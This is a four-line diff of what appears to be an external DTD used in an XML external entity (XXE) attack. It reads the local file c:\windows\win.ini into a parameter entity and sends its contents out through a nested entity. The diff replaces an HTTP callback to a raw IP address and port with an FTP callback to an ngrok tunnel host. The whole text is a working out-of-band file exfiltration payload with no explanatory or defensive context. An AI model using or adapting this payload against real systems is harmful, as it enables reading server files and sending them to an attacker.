@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file://c:\\windows\win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://139.180.153.63:8000/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp:///0.tcp.ap.ngrok.io:19256/%file;'>">
 %eval;
 %exfiltrate;
